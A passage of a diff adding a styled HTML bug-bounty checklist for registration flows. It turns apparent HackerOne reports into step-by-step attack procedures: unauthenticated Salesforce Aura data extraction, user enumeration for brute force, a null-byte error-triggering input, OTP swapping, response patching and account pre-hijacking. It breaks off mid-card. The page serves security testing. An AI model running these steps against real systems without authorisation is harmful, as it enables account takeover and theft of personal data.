@@ -1,0 +1,1404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Elite Registration Bug Hunter's Master Checklist</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
+
+  :root {
+    --bg-primary: #050a0e;
+    --bg-secondary: #090f14;
+    --bg-card: #0c1419;
+    --bg-card-hover: #101c24;
+    --accent-green: #00ff88;
+    --accent-red: #ff3355;
+    --accent-yellow: #ffc233;
+    --accent-blue: #00aaff;
+    --accent-purple: #aa55ff;
+    --accent-orange: #ff7733;
+    --text-primary: #c8d8e4;
+    --text-dim: #6a8499;
+    --border: #1a2e3a;
+    --border-glow: rgba(0,255,136,0.3);
+    --grid: rgba(0,255,136,0.03);
+  }
+
+  * { margin:0; padding:0; box-sizing:border-box; }
+
+  body {
+    background: var(--bg-primary);
+    color: var(--text-primary);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 15px;
+    line-height: 1.6;
+    background-image:
+      linear-gradient(var(--grid) 1px, transparent 1px),
+      linear-gradient(90deg, var(--grid) 1px, transparent 1px);
+    background-size: 40px 40px;
+    min-height: 100vh;
+  }
+
+  /* ─── HEADER ─── */
+  .hero {
+    background: linear-gradient(135deg, #050a0e 0%, #0a1520 50%, #050a0e 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 60px 20px 50px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+  .hero::before {
+    content: '';
+    position: absolute; inset: 0;
+    background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(0,255,136,0.06) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .hero-tag {
+    display: inline-block;
+    background: rgba(0,255,136,0.1);
+    border: 1px solid rgba(0,255,136,0.3);
+    color: var(--accent-green);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 4px 14px;
+    letter-spacing: 3px;
+    margin-bottom: 20px;
+    animation: pulse-border 2s ease-in-out infinite;
+  }
+  @keyframes pulse-border {
+    0%,100%{ box-shadow: 0 0 0 0 rgba(0,255,136,0.2); }
+    50%{ box-shadow: 0 0 12px 2px rgba(0,255,136,0.2); }
+  }
+  .hero h1 {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(22px, 4vw, 46px);
+    font-weight: 900;
+    letter-spacing: 2px;
+    color: #fff;
+    text-shadow: 0 0 30px rgba(0,255,136,0.4);
+    line-height: 1.2;
+    margin-bottom: 12px;
+  }
+  .hero h1 span { color: var(--accent-green); }
+  .hero-sub {
+    font-family: 'Share Tech Mono', monospace;
+    color: var(--text-dim);
+    font-size: 13px;
+    letter-spacing: 2px;
+    margin-bottom: 30px;
+  }
+  .hero-stats {
+    display: flex;
+    justify-content: center;
+    gap: 40px;
+    flex-wrap: wrap;
+  }
+  .stat {
+    text-align: center;
+  }
+  .stat-num {
+    font-family: 'Orbitron', monospace;
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--accent-green);
+  }
+  .stat-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+  }
+
+  /* ─── MAIN WRAPPER ─── */
+  .container { max-width: 1200px; margin: 0 auto; padding: 40px 20px 80px; }
+
+  /* ─── PHASE HEADER ─── */
+  .phase-header {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    margin: 50px 0 24px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+    position: relative;
+  }
+  .phase-header::after {
+    content: '';
+    position: absolute;
+    bottom: -1px; left: 0;
+    width: 200px; height: 1px;
+    background: var(--phase-color, var(--accent-green));
+    box-shadow: 0 0 10px var(--phase-color, var(--accent-green));
+  }
+  .phase-badge {
+    background: var(--phase-color, var(--accent-green));
+    color: #000;
+    font-family: 'Orbitron', monospace;
+    font-size: 10px;
+    font-weight: 700;
+    padding: 6px 14px;
+    letter-spacing: 1px;
+    white-space: nowrap;
+  }
+  .phase-title {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(14px, 2.5vw, 20px);
+    font-weight: 700;
+    color: #fff;
+  }
+  .phase-goal {
+    margin-left: auto;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    text-align: right;
+    max-width: 300px;
+    display: none;
+  }
+  @media(min-width:768px){ .phase-goal{ display:block; } }
+
+  /* ─── REPORT CARDS GRID ─── */
+  .cards-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+    gap: 20px;
+  }
+
+  /* ─── REPORT CARD ─── */
+  .card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    position: relative;
+    transition: border-color 0.2s, transform 0.2s, box-shadow 0.2s;
+    cursor: default;
+  }
+  .card:hover {
+    border-color: var(--card-color, var(--accent-green));
+    box-shadow: 0 0 20px rgba(0,255,136,0.07), inset 0 0 30px rgba(0,255,136,0.02);
+    transform: translateY(-2px);
+  }
+  .card-header {
+    padding: 16px 18px 12px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: flex-start;
+    gap: 14px;
+  }
+  .report-num {
+    font-family: 'Orbitron', monospace;
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--card-color, var(--accent-green));
+    background: rgba(0,255,136,0.07);
+    border: 1px solid var(--card-color, var(--accent-green));
+    padding: 3px 8px;
+    white-space: nowrap;
+    opacity: 0.8;
+  }
+  .card-title-block {}
+  .card-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-weight: 700;
+    font-size: 15px;
+    color: #fff;
+    line-height: 1.3;
+    margin-bottom: 4px;
+  }
+  .card-meta {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    align-items: center;
+  }
+  .badge-cat {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    padding: 2px 7px;
+    border: 1px solid;
+    letter-spacing: 1px;
+  }
+  .sev-critical { color: var(--accent-red); border-color: var(--accent-red); background: rgba(255,51,85,0.08); }
+  .sev-high     { color: var(--accent-orange); border-color: var(--accent-orange); background: rgba(255,119,51,0.08); }
+  .sev-medium   { color: var(--accent-yellow); border-color: var(--accent-yellow); background: rgba(255,194,51,0.08); }
+  .sev-low      { color: var(--accent-blue); border-color: var(--accent-blue); background: rgba(0,170,255,0.08); }
+
+  .card-body { padding: 16px 18px; }
+
+  /* OBJECTIVE */
+  .obj-row {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 14px;
+    padding: 10px 12px;
+    background: rgba(0,0,0,0.3);
+    border-left: 3px solid var(--card-color, var(--accent-green));
+  }
+  .obj-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    color: var(--card-color, var(--accent-green));
+    letter-spacing: 2px;
+    white-space: nowrap;
+    padding-top: 2px;
+  }
+  .obj-text {
+    font-size: 13px;
+    color: var(--text-primary);
+    line-height: 1.5;
+  }
+
+  /* STEPS */
+  .steps-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    margin-bottom: 10px;
+  }
+  .checklist {
+    list-style: none;
+    display: flex;
+    flex-direction: column;
+    gap: 7px;
+    margin-bottom: 16px;
+  }
+  .checklist li {
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    font-size: 13px;
+    line-height: 1.5;
+  }
+  .check-box {
+    width: 16px;
+    height: 16px;
+    border: 1px solid var(--card-color, var(--accent-green));
+    flex-shrink: 0;
+    margin-top: 2px;
+    cursor: pointer;
+    transition: background 0.15s;
+    position: relative;
+  }
+  .check-box.done {
+    background: var(--card-color, var(--accent-green));
+  }
+  .check-box.done::after {
+    content: '✓';
+    position: absolute;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 10px;
+    color: #000;
+    font-weight: 900;
+  }
+  .check-text { flex: 1; }
+  .check-text code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    background: rgba(0,255,136,0.07);
+    border: 1px solid rgba(0,255,136,0.15);
+    padding: 1px 5px;
+    color: var(--accent-green);
+  }
+
+  /* MINDSET BOX */
+  .mindset {
+    background: rgba(0,0,0,0.4);
+    border: 1px solid rgba(255,194,51,0.2);
+    padding: 12px 14px;
+    position: relative;
+    margin-top: 4px;
+  }
+  .mindset::before {
+    content: '👑 VETERAN MINDSET';
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    color: var(--accent-yellow);
+    letter-spacing: 2px;
+    display: block;
+    margin-bottom: 6px;
+  }
+  .mindset p {
+    font-size: 12px;
+    color: var(--accent-yellow);
+    font-style: italic;
+    line-height: 1.6;
+  }
+
+  /* ─── CHAIN CHAIN CHAIN ─── */
+  .chain-box {
+    background: linear-gradient(135deg, rgba(170,85,255,0.05), rgba(255,51,85,0.05));
+    border: 1px solid rgba(170,85,255,0.3);
+    padding: 30px;
+    margin-top: 50px;
+    text-align: center;
+  }
+  .chain-box h2 {
+    font-family: 'Orbitron', monospace;
+    font-size: 18px;
+    color: var(--accent-purple);
+    margin-bottom: 16px;
+  }
+  .chain-formula {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 20px;
+    color: #fff;
+    margin: 20px 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+  .chain-formula .part { padding: 8px 16px; border: 1px solid; }
+  .p1 { color: var(--accent-blue); border-color: var(--accent-blue); background: rgba(0,170,255,0.08); }
+  .p2 { color: var(--accent-yellow); border-color: var(--accent-yellow); background: rgba(255,194,51,0.08); }
+  .p3 { color: var(--accent-red); border-color: var(--accent-red); background: rgba(255,51,85,0.08); }
+  .p4 { color: var(--accent-green); border-color: var(--accent-green); background: rgba(0,255,136,0.08); }
+  .chain-formula .op { color: var(--accent-purple); font-size: 24px; }
+  .chain-examples {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 14px;
+    margin-top: 20px;
+    text-align: left;
+  }
+  .chain-ex {
+    background: rgba(0,0,0,0.4);
+    border: 1px solid var(--border);
+    padding: 14px;
+  }
+  .chain-ex-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--accent-purple);
+    letter-spacing: 1px;
+    margin-bottom: 8px;
+  }
+  .chain-ex p { font-size: 12px; line-height: 1.6; }
+
+  /* ─── MASTER TABLE ─── */
+  .master-table-section { margin-top: 50px; }
+  .master-table-section h2 {
+    font-family: 'Orbitron', monospace;
+    font-size: 18px;
+    color: #fff;
+    margin-bottom: 20px;
+    padding-bottom: 10px;
+    border-bottom: 1px solid var(--border);
+  }
+  .table-wrap { overflow-x: auto; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+    font-family: 'Share Tech Mono', monospace;
+  }
+  thead tr {
+    background: rgba(0,255,136,0.06);
+    border-bottom: 2px solid var(--accent-green);
+  }
+  th {
+    padding: 10px 14px;
+    text-align: left;
+    color: var(--accent-green);
+    letter-spacing: 1px;
+    font-size: 10px;
+  }
+  tbody tr {
+    border-bottom: 1px solid var(--border);
+    transition: background 0.15s;
+  }
+  tbody tr:hover { background: var(--bg-card-hover); }
+  td { padding: 9px 14px; vertical-align: top; }
+  td:first-child { color: var(--text-dim); }
+  td:nth-child(2) { color: #fff; font-weight: bold; }
+
+  /* ─── PROGRESS BAR ─── */
+  .progress-section {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    padding: 24px;
+    margin-top: 50px;
+  }
+  .progress-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 14px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+  }
+  #prog-count { color: var(--accent-green); font-size: 18px; font-family: 'Orbitron', monospace; }
+  .prog-bar-bg {
+    background: rgba(0,0,0,0.5);
+    height: 6px;
+    width: 100%;
+    position: relative;
+  }
+  .prog-bar-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
+    width: 0%;
+    transition: width 0.3s;
+    box-shadow: 0 0 8px rgba(0,255,136,0.5);
+  }
+
+  /* ─── FOOTER ─── */
+  footer {
+    text-align: center;
+    padding: 30px 20px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    border-top: 1px solid var(--border);
+    letter-spacing: 2px;
+  }
+
+  /* ─── SCROLL ANIMATION ─── */
+  .card { opacity: 0; transform: translateY(20px); transition: opacity 0.5s, transform 0.5s; }
+  .card.visible { opacity: 1; transform: translateY(0); }
+</style>
+</head>
+<body>
+
+<!-- ═══════════════════ HERO ═══════════════════ -->
+<div class="hero">
+  <div class="hero-tag">// CLASSIFIED: ELITE TIER //</div>
+  <h1>🛡️ REGISTRATION <span>BUG HUNTER'S</span><br>MASTER CHECKLIST</h1>
+  <div class="hero-sub">[ 30 HACKERONE REPORTS · 5 PHASES · 25 ATTACK VECTORS · WORLD-CLASS SOP ]</div>
+  <div class="hero-stats">
+    <div class="stat"><div class="stat-num">30</div><div class="stat-label">REPORTS ANALYZED</div></div>
+    <div class="stat"><div class="stat-num">5</div><div class="stat-label">ATTACK PHASES</div></div>
+    <div class="stat"><div class="stat-num">25</div><div class="stat-label">TECHNIQUES</div></div>
+    <div class="stat"><div class="stat-num">∞</div><div class="stat-label">BOUNTY POTENTIAL</div></div>
+  </div>
+</div>
+
+<!-- ═══════════════════ PROGRESS ═══════════════════ -->
+<div class="container">
+  <div class="progress-section">
+    <div class="progress-header">
+      <span>CHECKLIST COMPLETION</span>
+      <span><span id="prog-count">0</span> / 25 ITEMS CHECKED</span>
+    </div>
+    <div class="prog-bar-bg"><div class="prog-bar-fill" id="prog-fill"></div></div>
+  </div>
+
+<!-- ═══════════════════════════════════════════════════
+     PHASE 1: RECONNAISSANCE
+═══════════════════════════════════════════════════ -->
+<div class="phase-header" style="--phase-color:#00ff88">
+  <div class="phase-badge">PHASE 01</div>
+  <div class="phase-title">RECONNAISSANCE — Map the Hidden Attack Surface</div>
+  <div class="phase-goal">Find the invisible before the attack</div>
+</div>
+<div class="cards-grid">
+
+  <!-- REPORT 01 -->
+  <div class="card" style="--card-color:#00ff88">
+    <div class="card-header">
+      <div class="report-num">#01</div>
+      <div class="card-title-block">
+        <div class="card-title">Salesforce Aura — Unauthenticated Data Disclosure</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#00aaff;border-color:#00aaff;background:rgba(0,170,255,0.08)">BROKEN ACCESS CONTROL</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Extract PII from Salesforce backend without any authentication credentials.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Scan target for endpoints containing <code>/sfsites/aura</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Intercept POST request to <code>/aura</code> controller in Burp Suite</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Strip ALL cookies, Authorization headers, and CSRF tokens</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Modify <code>message</code> parameter to query ContentDocument / User records</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Set <code>pageSize=2000</code> to maximize single-request data extraction</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Confirm: 200 OK with JSON list of internal records = VULN CONFIRMED</div></li>
+      </ul>
+      <div class="mindset"><p>"A registration page is often just a pretty face for a massive, misconfigured API. Always check what the 'Guest' profile can see behind the scenes."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 02 -->
+  <div class="card" style="--card-color:#00aaff">
+    <div class="card-header">
+      <div class="report-num">#02</div>
+      <div class="card-title-block">
+        <div class="card-title">Instagram / Advanced User Enumeration & Timing Analysis</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-medium">MEDIUM</span>
+          <span class="badge-cat" style="color:#00aaff;border-color:#00aaff;background:rgba(0,170,255,0.08)">INFO DISCLOSURE</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Verify existence of specific users (admins/employees) to enable brute-force or social engineering attacks.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Submit known registered email vs non-existent email on signup/login</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Compare response strings: "Email taken" vs "Email available" — any difference = leak</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Use Burp Repeater to measure response times (300ms vs 100ms = timing leak)</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Fuzz hidden endpoints: <code>/wp-json/v1/user-exists</code>, <code>/api/v1/auth/check-user</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Build username list → use for targeted password brute force</div></li>
+      </ul>
+      <div class="mindset"><p>"Knowing who is on the system is 50% of the hack. Never ignore a verbose error message; it's a map to your next target."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 03 -->
+  <div class="card" style="--card-color:#ffc233">
+    <div class="card-header">
+      <div class="report-num">#03</div>
+      <div class="card-title-block">
+        <div class="card-title">Google — Internal IP & Infrastructure Disclosure</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-medium">MEDIUM</span>
+          <span class="badge-cat" style="color:#ffc233;border-color:#ffc233;background:rgba(255,194,51,0.08)">SECURITY MISCONFIG</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Identify internal IPs and backend server details to map internal network for SSRF attacks.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Inspect ALL HTTP response headers on every registration request</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Search for: <code>X-Served-By</code>, <code>X-Backend-Server</code>, <code>X-Internal-IP</code>, <code>X-Proxy-ID</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Send malformed input: <code>email=admin@site.com%00</code> to trigger verbose 404/500 errors</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Identify private IP ranges: <code>10.x.x.x</code> or <code>172.16.x.x</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Note all findings for SSRF chaining in later phases</div></li>
+      </ul>
+      <div class="mindset"><p>"The Server header is usually a lie (Cloudflare), but custom internal headers are the truth. They reveal the real machine behind the shield."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 04 -->
+  <div class="card" style="--card-color:#ff7733">
+    <div class="card-header">
+      <div class="report-num">#04</div>
+      <div class="card-title-block">
+        <div class="card-title">Uber — Sensitive Token Leakage via Referer Header</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#ff7733;border-color:#ff7733;background:rgba(255,119,51,0.08)">DATA LEAKAGE</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Hijack registration/verification tokens by forcing the browser to leak them to external 3rd-party domains.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Trigger verification email → navigate to link (e.g. <code>site.com/verify?token=SECRET</code>)</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Locate ALL outbound links on that page: Social icons, Terms of Service, Help docs</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Click external link while Burp Suite monitors traffic</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Check Referer header sent to 3rd-party site — does it contain the full token URL?</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">If yes: token is compromised via browser default behavior → IMPACT: ACCOUNT TAKEOVER</div></li>
+      </ul>
+      <div class="mindset"><p>"Security is a chain. Even if your site is secure, the 3rd-party 'Help' button might be stealing your keys via the browser's default behavior."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 05 -->
+  <div class="card" style="--card-color:#aa55ff">
+    <div class="card-header">
+      <div class="report-num">#05</div>
+      <div class="card-title-block">
+        <div class="card-title">Mail.ru — Mass Account Creation (No Rate Limiting)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-medium">MEDIUM</span>
+          <span class="badge-cat" style="color:#aa55ff;border-color:#aa55ff;background:rgba(170,85,255,0.08)">INSECURE DESIGN</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Overwhelm database resources and bypass security controls by automating registration of thousands of accounts.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Capture a successful signup POST request in Burp Suite</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Send to Burp Intruder → define payload position on email: <code>victim+§1§@gmail.com</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Use number generator or wordlist, run with high concurrency threads</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Check if system triggers CAPTCHA, <code>429 Too Many Requests</code>, or IP ban</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">No defense found = Rate Limit bypass confirmed → Business Logic Bug</div></li>
+      </ul>
+      <div class="mindset"><p>"If I can automate it, I can break the business model. No rate limit means the database is a garbage bin waiting to be filled."</p></div>
+    </div>
+  </div>
+
+</div><!-- /cards-grid phase1 -->
+
+
+<!-- ═══════════════════════════════════════════════════
+     PHASE 2: AUTHENTICATION & LOGIC BYPASS
+═══════════════════════════════════════════════════ -->
+<div class="phase-header" style="--phase-color:#ff7733; margin-top:60px">
+  <div class="phase-badge" style="background:#ff7733">PHASE 02</div>
+  <div class="phase-title">AUTHENTICATION & LOGIC BYPASS — Break the Gates</div>
+  <div class="phase-goal">Bypass email/phone verification & workflow flaws</div>
+</div>
+<div class="cards-grid">
+
+  <!-- REPORT 06 -->
+  <div class="card" style="--card-color:#ff3355">
+    <div class="card-header">
+      <div class="report-num">#06</div>
+      <div class="card-title-block">
+        <div class="card-title">Mattermost — Global OTP Validation (Token Swap)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-critical">CRITICAL</span>
+          <span class="badge-cat" style="color:#ff3355;border-color:#ff3355;background:rgba(255,51,85,0.08)">BROKEN AUTH</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Verify ANY victim's email by using an OTP generated for attacker's own account (Global OTP flaw).</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Open two browsers — one for Attacker, one for Victim session</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Trigger OTP for Victim's email (sent to victim, you can't see it)</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Start parallel signup with Attacker's own email → receive YOUR OTP</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Go to Victim's verification page → enter YOUR OTP → intercept in Burp</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Check: does request contain only <code>{"otp":"123456"}</code> with NO session/email binding?</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">If yes: server validates token globally → VICTIM ACCOUNT VERIFIED by attacker</div></li>
+      </ul>
+      <div class="mindset"><p>"Always check if the OTP is 'bound' to the email. If the server only checks if the token exists in its database, the entire authentication is a house of cards."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 07 -->
+  <div class="card" style="--card-color:#00aaff">
+    <div class="card-header">
+      <div class="report-num">#07</div>
+      <div class="card-title-block">
+        <div class="card-title">Twitter / Airbnb — Response Manipulation (Boolean Patching)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#00aaff;border-color:#00aaff;background:rgba(0,170,255,0.08)">IMPROPER AUTHZ</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Trick server into believing account is verified by modifying server's own response in transit.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Register account → reach "Please Verify Email" screen</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">In Burp: right-click → <code>Do Intercept → Response to this request</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Find flags: <code>"is_verified": false</code>, <code>"confirmed": 0</code>, <code>"status": "pending"</code></div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Patch: change to <code>true</code> / <code>1</code> / <code>"success"</code> → forward response</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Check: does UI redirect to dashboard? Can you perform "Verified-only" actions? = BYPASS CONFIRMED</div></li>
+      </ul>
+      <div class="mindset"><p>"Client-side security is an illusion. If the server trusts the browser's modified 'truth', the application is fundamentally broken."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 08 -->
+  <div class="card" style="--card-color:#00ff88">
+    <div class="card-header">
+      <div class="report-num">#08</div>
+      <div class="card-title-block">
+        <div class="card-title">Acronis — Unverified Profile Update Bypass</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#00ff88;border-color:#00ff88;background:rgba(0,255,136,0.08)">INSECURE DESIGN</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Gain full access by changing email address while in "Pending Verification" state — state machine bypass.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Register with fake/disposable email → enter "Limited Access" pending state</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Directly navigate to <code>/settings</code> or <code>/profile</code> via URL (no button needed)</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Change email from disposable to attacker's real/target email</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Observe: does system "forget" previous verification requirement for new email?</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">If full access granted immediately = State Machine Bypass confirmed</div></li>
+      </ul>
+      <div class="mindset"><p>"Registration is a state machine. If you can jump from 'State A' (Unverified) to 'State C' (Verified) by passing through 'State B' (Profile Edit), you've broken the logic."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 09 -->
+  <div class="card" style="--card-color:#ffc233">
+    <div class="card-header">
+      <div class="report-num">#09</div>
+      <div class="card-title-block">
+        <div class="card-title">Tucows — Account Pre-Hijacking (Collision Attack)</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-high">HIGH</span>
+          <span class="badge-cat" style="color:#ffc233;border-color:#ffc233;background:rgba(255,194,51,0.08)">BUSINESS LOGIC</span>
+        </div>
+      </div>
+    </div>
+    <div class="card-body">
+      <div class="obj-row">
+        <div class="obj-label">TARGET</div>
+        <div class="obj-text">Take over a victim's future account by registering their email BEFORE they do.</div>
+      </div>
+      <div class="steps-title">// EXECUTION CHECKLIST</div>
+      <ul class="checklist">
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Find victim email (LinkedIn, data breach, public profile) not yet registered</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Pre-register account using victim's email + attacker's chosen password</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Check: does site allow password set WITHOUT immediate email verification?</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">Test Social Login merge: does "Sign in with Google" merge with existing email record?</div></li>
+        <li><div class="check-box" onclick="toggleCheck(this)"></div><div class="check-text">If merge exists: attacker maintains access even after victim resets password</div></li>
+      </ul>
+      <div class="mindset"><p>"The race for an account starts before the user even arrives. If I own the email record in the DB, I own the user's future data."</p></div>
+    </div>
+  </div>
+
+  <!-- REPORT 10 -->
+  <div class="card" style="--card-color:#aa55ff">
+    <div class="card-header">
+      <div class="report-num">#10</div>
+      <div class="card-title-block">
+        <div class="card-title">GitLab — Case-Sensitivity & Email Alias Bypass</div>
+        <div class="card-meta">
+          <span class="badge-cat sev-medium">MEDIUM</span>
